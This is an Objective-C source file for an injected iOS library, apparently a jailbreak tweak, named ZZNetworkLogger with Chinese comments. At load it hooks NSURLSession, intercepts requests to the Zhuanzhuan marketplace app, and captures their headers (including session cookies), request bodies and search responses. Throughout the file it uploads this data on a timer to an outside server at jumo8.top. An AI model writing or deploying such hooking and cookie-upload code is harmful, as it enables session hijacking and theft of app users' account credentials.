// ZZNetworkLogger - 转转网络请求拦截 + 自动上传
// ==============================================
// 功能:
//   1. Hook NSURLSession/NSURLConnection 拦截 app.zhuanzhuan.com 请求
//   2. 捕获 Cookie + 请求体
//   3. POST 到 https://jumo8.top/api（JSON 格式）
//   4. 上传完毕显示系统通知
//
// 服务器端: CF Worker at jumo8.top/api
//   自动提取 Cookie → 搜索 → 查 iOS 版本
// ==============================================

#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import <objc/message.h>
#import <dlfcn.h>
#import <notify.h>

// ==================== 配置 ====================
static NSString *const kUploadURL = @"https://jumo8.top/api";
static NSString *const kTargetHost = @"app.zhuanzhuan.com";

// ==================== 请求收集 ====================
static NSMutableDictionary *_pendingRequests;

@interface ZZNetworkLogger : NSObject
+ (instancetype)shared;
- (void)logRequest:(NSURLRequest *)request;
- (void)logResponse:(NSURLResponse *)response data:(NSData *)data forRequest:(NSURLRequest *)request;
- (void)uploadPendingData;
@end

@implementation ZZNetworkLogger

+ (instancetype)shared {
    static ZZNetworkLogger *instance;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{ instance = [[ZZNetworkLogger alloc] init]; });
    return instance;
}

- (instancetype)init {
    if (self = [super init]) {
        _pendingRequests = [NSMutableDictionary dictionary];
        // 定时上传（每30秒检查一次）
        [NSTimer scheduledTimerWithTimeInterval:30.0 repeats:YES block:^(NSTimer *t) {
            [[ZZNetworkLogger shared] uploadPendingData];
        }];
        // 启动5秒后首次上传
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
            [[ZZNetworkLogger shared] uploadPendingData];
        });
        NSLog(@"[ZZLogger] ✅ 初始化完成，目标: %@", kUploadURL);
    }
    return self;
}

- (void)logRequest:(NSURLRequest *)request {
    NSString *urlStr = request.URL.absoluteString;
    
    // 只拦截 app.zhuanzhuan.com 的请求
    if (![request.URL.host containsString:kTargetHost]) return;
    
    @synchronized(_pendingRequests) {
        NSString *key = [NSString stringWithFormat:@"%p_%lld", request, (long long)[[NSDate date] timeIntervalSince1970] * 1000];
        
        NSMutableDictionary *entry = [NSMutableDictionary dictionary];
        entry[@"url"] = urlStr;
        entry[@"method"] = request.HTTPMethod ?: @"GET";
        entry[@"timestamp"] = @([[NSDate date] timeIntervalSince1970] * 1000);
        
        // 收集请求头（含 Cookie）
        NSDictionary *headers = request.allHTTPHeaderFields;
        if (headers) {
            NSMutableDictionary *cleanHeaders = [NSMutableDictionary dictionaryWithDictionary:headers];
            entry[@"headers"] = cleanHeaders;
        }
        
        // 收集请求体
        if (request.HTTPBody) {
            NSString *bodyStr = [[NSString alloc] initWithData:request.HTTPBody encoding:NSUTF8StringEncoding];
            if (bodyStr) {
                entry[@"body"] = bodyStr;
            }
        }
        
        _pendingRequests[key] = entry;
        NSLog(@"[ZZLogger] 📡 拦截: %@ %@", request.HTTPMethod, urlStr.lastPathComponent);
    }
}

- (void)logResponse:(NSURLResponse *)response data:(NSData *)data forRequest:(NSURLRequest *)request {
    NSString *urlStr = request.URL.absoluteString;
    if (![request.URL.host containsString:kTargetHost]) return;
    
    @synchronized(_pendingRequests) {
        NSString *keyPrefix = [NSString stringWithFormat:@"%p", request];
        
        // 找到对应的请求条目
        for (NSString *key in _pendingRequests.allKeys) {
            if ([key hasPrefix:keyPrefix]) {
                NSMutableDictionary *entry = _pendingRequests[key];
                
                // 如果是搜索请求，保存响应中的 infoId
                if ([urlStr containsString:@"/transfer/search"] && data) {
                    NSString *respStr = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                    if (respStr) {
                        entry[@"_search_response"] = respStr;
                    }
                }
                
                // 标记为就绪
                entry[@"_ready"] = @YES;
                break;
            }
        }
    }
    
    // 有搜索结果后立即上传
    if ([urlStr containsString:@"/transfer/search"]) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC), dispatch_get_global_queue(0, 0), ^{
            [[ZZNetworkLogger shared] uploadPendingData];
        });
    }
}

- (void)uploadPendingData {
    NSArray *toUpload;
    
    @synchronized(_pendingRequests) {
        // 筛选就绪的或搜索请求
        NSMutableArray *selected = [NSMutableArray array];
        NSMutableArray *keysToRemove = [NSMutableArray array];
        
        for (NSString *key in _pendingRequests) {
            NSDictionary *entry = _pendingRequests[key];
            
            // 上传所有就绪的条目（有响应的）或任意条目
            [selected addObject:entry];
            [keysToRemove addObject:key];
        }
        
        if (selected.count == 0) return;
        
        toUpload = [selected copy];
        [_pendingRequests removeObjectsForKeys:keysToRemove];
    }
    
    [self uploadEntries:toUpload retryCount:0];
}

- (void)uploadEntries:(NSArray *)entries retryCount:(int)retry {
    if (entries.count == 0) return;
    if (retry > 3) {
        NSLog(@"[ZZLogger] ❌ 上传重试超过3次，放弃");
        return;
    }
    
    // 构建上传数据
    NSDictionary *uploadData = @{
        @"logs": entries,
        @"device_serial": [self deviceSerial],
        @"device_model": [self deviceModel],
        @"ios_version": [[UIDevice currentDevice] systemVersion],
        @"timestamp": @([[NSDate date] timeIntervalSince1970] * 1000),
    };
    
    NSError *jsonErr;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:uploadData options:0 error:&jsonErr];
    if (!jsonData) return;
    
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:kUploadURL]];
    req.HTTPMethod = @"POST";
    req.HTTPBody = jsonData;
    [req setValue:@"application/json; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    req.timeoutInterval = 30;
    
    NSLog(@"[ZZLogger] ⬆️ 上传 %lu 条 (%.1fKB)", (unsigned long)entries.count, jsonData.length / 1024.0);
    
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
        if (err) {
            NSLog(@"[ZZLogger] ❌ 上传失败: %@", err.localizedDescription);
            // 重试
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC), dispatch_get_global_queue(0, 0), ^{
                [self uploadEntries:entries retryCount:retry + 1];
            });
            return;
        }
        
        NSHTTPURLResponse *httpResp = (NSHTTPURLResponse *)resp;
        NSLog(@"[ZZLogger] ✅ 上传完成 HTTP %ld", (long)httpResp.statusCode);
        
        // 完成日志
        dispatch_async(dispatch_get_main_queue(), ^{
            NSLog(@"[ZZLogger] 📱 上传成功 %lu条", (unsigned long)entries.count);
        });
    }];
    [task resume];
}

- (NSString *)deviceSerial {
    // 简化版 - 不需要 IOKit
    return @"unknown";
}

- (NSString *)deviceModel {
    return [UIDevice currentDevice].model;
}

@end

// ==================== Hook NSURLSession ====================

// Hook dataTaskWithRequest:completionHandler:
static id (*orig_dataTaskWithRequest)(id, SEL, NSURLRequest *, id);

static id hooked_dataTaskWithRequest(id self, SEL _cmd, NSURLRequest *request, id completionHandler) {
    [[ZZNetworkLogger shared] logRequest:request];
    
    // Wrap completionHandler 来捕获响应
    id newHandler = ^(NSData *data, NSURLResponse *response, NSError *error) {
        if (data && response) {
            [[ZZNetworkLogger shared] logResponse:response data:data forRequest:request];
        }
        // 调用原始 completion
        ((void (^)(NSData *, NSURLResponse *, NSError *))completionHandler)(data, response, error);
    };
    
    return orig_dataTaskWithRequest(self, _cmd, request, [newHandler copy]);
}

// 我们也要 hook uploadTaskWithRequest:fromData:completionHandler:
static id (*orig_uploadTask)(id, SEL, NSURLRequest *, NSData *, id);

static id hooked_uploadTask(id self, SEL _cmd, NSURLRequest *request, NSData *body, id completionHandler) {
    [[ZZNetworkLogger shared] logRequest:request];
    
    id newHandler = ^(NSData *data, NSURLResponse *response, NSError *error) {
        if (data && response) {
            [[ZZNetworkLogger shared] logResponse:response data:data forRequest:request];
        }
        ((void (^)(NSData *, NSURLResponse *, NSError *))completionHandler)(data, response, error);
    };
    
    return orig_uploadTask(self, _cmd, request, body, [newHandler copy]);
}

// ==================== 启动 ====================

__attribute__((constructor))
static void ZZNetworkLoggerInit() {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        // Hook NSURLSession dataTaskWithRequest:
        Class sessionClass = NSClassFromString(@"NSURLSession");
        if (sessionClass) {
            Method m1 = class_getInstanceMethod(sessionClass, @selector(dataTaskWithRequest:completionHandler:));
            if (m1) {
                orig_dataTaskWithRequest = (void *)method_getImplementation(m1);
                method_setImplementation(m1, (IMP)hooked_dataTaskWithRequest);
                NSLog(@"[ZZLogger] ✅ Hooked dataTaskWithRequest:");
            }
            
            Method m2 = class_getInstanceMethod(sessionClass, @selector(uploadTaskWithRequest:fromData:completionHandler:));
            if (m2) {
                orig_uploadTask = (void *)method_getImplementation(m2);
                method_setImplementation(m2, (IMP)hooked_uploadTask);
                NSLog(@"[ZZLogger] ✅ Hooked uploadTaskWithRequest:");
            }
        }
        
        // Hook 转转专有的网络层
        [ZZNetworkLogger shared]; // 触发初始化
        
        NSLog(@"[ZZLogger] 🚀 ZZNetworkLogger v1.0 已启动");
    });
}
